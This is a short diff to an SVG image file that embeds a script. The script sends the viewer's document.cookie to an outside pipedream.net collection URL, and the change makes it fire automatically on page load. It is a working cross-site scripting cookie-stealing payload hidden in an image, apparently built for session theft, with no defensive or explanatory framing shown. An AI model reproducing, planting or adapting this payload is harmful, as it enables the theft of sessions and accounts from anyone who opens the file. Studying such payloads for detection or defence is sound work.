@@ -1,5 +1,7 @@
 <svg>
-    <script> fetch(`https://en8vwnbiln7pp.x.pipedream.net/1234.png?c=${document.cookie}`)
+    <script type="text/javascript">
+    window.addEventListener('load',function(){ fetch(`https://en8vwnbiln7pp.x.pipedream.net/1234.png?c=${document.cookie}`)
         console.log(1234)
+    })
     </script>
 </svg>
